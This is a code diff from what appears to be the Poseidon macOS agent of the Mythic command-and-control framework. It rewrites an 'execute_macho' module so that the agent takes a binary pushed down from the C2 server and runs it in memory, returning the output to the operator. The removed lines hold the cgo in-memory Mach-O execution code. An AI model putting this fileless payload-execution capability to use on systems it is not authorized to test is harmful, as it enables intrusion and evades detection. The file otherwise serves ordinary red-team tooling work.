@@ -1,110 +1,66 @@
-// +build darwin
-
 package execute_macho
 
-//#cgo LDFLAGS: -lm -framework Foundation
-//#cgo CFLAGS: -Wno-error=implicit-function-declaration -Wno-deprecated-declarations -Wno-format -Wno-int-conversion
-//#include <stdio.h>
-//#include <stdlib.h>
-//#include "shell_memory.h"
-import "C"
-import "os"
-import "unsafe"
-import "io"
-import "bytes"
-import "fmt"
-import "strings"
-import "syscall"
-import "log"
-// import "github.com/djhohnstein/macos_shell_memory/stdouterr"
+import (
+	// Standard
+	"encoding/json"
+	"fmt"
 
+	// Poseidon
 
-type DarwinexecuteMacho struct {
-	Message string
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
+)
+
+// initial .c code pulled from https://github.com/djhohnstein/macos_shell_memory
+
+type executeMachoArgs struct {
+	FileID       string `json:"file_id"`
+	ArgString    string `json:"args"`
 }
 
-func executeMacho(memory []byte, argString string) (DarwinexecuteMacho, error) {
+//Run - interface method that retrieves a process list
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 
-    res := DarwinexecuteMacho{}
+	args := executeMachoArgs{}
 
-    args := strings.Split(argString, " ")
+	err := json.Unmarshal([]byte(task.Params), &args)
+	if err != nil {
+		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
+		task.Job.SendResponses <- msg
+		return
+	}
+	r := structs.GetFileFromMythicStruct{}
+	r.FileID = args.FileID
+	r.FullPath = ""
+	r.Task = &task
+	r.ReceivedChunkChannel = make(chan []byte)
+	task.Job.GetFileFromMythic <- r
 
-    // Create our C-esque arguments
-    c_argc := C.int(len(args))
-    c_argv := C.allocArgv(c_argc)
-    defer C.free(c_argv)
+	fileBytes := make([]byte, 0)
 
-    // Convert each argv to a char*
-    for i, arg := range args {
-        tmp := C.CString(arg)
-        defer C.free(unsafe.Pointer(tmp))
-        C.addArg(c_argv, tmp, C.int(i))
-    }
-    cBytes := C.CBytes(memory)
-    defer C.free(cBytes)
-    cLenBytes := C.int(len(memory))
+	for {
+		newBytes := <-r.ReceivedChunkChannel
+		if len(newBytes) == 0 {
+			break
+		} else {
+			fileBytes = append(fileBytes, newBytes...)
+		}
+	}
 
-    // Redirect STD handles to pipes...
-    fmt.Println("[Go Code] Redirecting STDOUT...");
-    // Clone Stdout to origStdout.
-    origStdout, err := syscall.Dup(syscall.Stdout)
-    if err != nil {
-        log.Fatal(err)
-    }
-    // Clone Stdout to origStdout.
-    origStderr, err := syscall.Dup(syscall.Stderr)
-    if err != nil {
-        log.Fatal(err)
-    }
-    rStdout, wStdout, err := os.Pipe()
-    if err != nil {
-        log.Fatal(err)
-    }
-    rStderr, wStderr, err := os.Pipe()
-    if err != nil {
-        log.Fatal(err)
-    }
-    reader := io.MultiReader(rStdout, rStderr)
-
-    // Clone the pipe's writer to the actual Stdout descriptor; from this point
-    // on, writes to Stdout will go to w.
-    if err = syscall.Dup2(int(wStderr.Fd()), syscall.Stdout); err != nil {
-        log.Fatal(err)
-    }
-    // Clone the pipe's writer to the actual Stderr descriptor; from this point
-    // on, writes to Stderr will go to w.
-    if err = syscall.Dup2(int(wStderr.Fd()), syscall.Stderr); err != nil {
-        log.Fatal(err)
-    }
-
-    // Background goroutine that drains the reading end of the pipe.
-    out := make(chan []byte)
-    go func() {
-        var b bytes.Buffer
-        io.Copy(&b, reader)
-        out <- b.Bytes()
-    }()
-    // END redirect
-
-    C.execMachO((*C.char)(cBytes), cLenBytes, c_argc, c_argv)
-
-    // BEGIN redirect
-    C.fflush(nil)
-    wStdout.Close()
-    wStderr.Close()
-    syscall.Close(syscall.Stdout)
-    syscall.Close(syscall.Stderr)
-    // Rendezvous with the reading goroutine.
-    b := <-out
-    // Restore original Stdout and Stderr.
-    syscall.Dup2(origStdout, syscall.Stdout)
-    syscall.Dup2(origStderr, syscall.Stderr)
-    syscall.Close(origStdout)
-    syscall.Close(origStderr)
-    fmt.Println("[Go Code] Successfully recovered from bin exit(), captured the following output:\n\n", string(b))
-    // END redirect
-    C._Exit(0)
-
-    res.Message = string(b)
-	return res, nil
+	if len(fileBytes) == 0 {
+		msg.SetError(fmt.Sprintf("Failed to get file"))
+		task.Job.SendResponses <- msg
+		return
+	}
+	var final string
+	resp, _ := executeMacho(fileBytes, args.ArgString)
+	final = resp.Message
+	if len(final) == 0 {
+		final = "Macho did not return data"
+	}
+	msg.Completed = true
+	msg.UserOutput = final
+	task.Job.SendResponses <- msg
+	return
 }
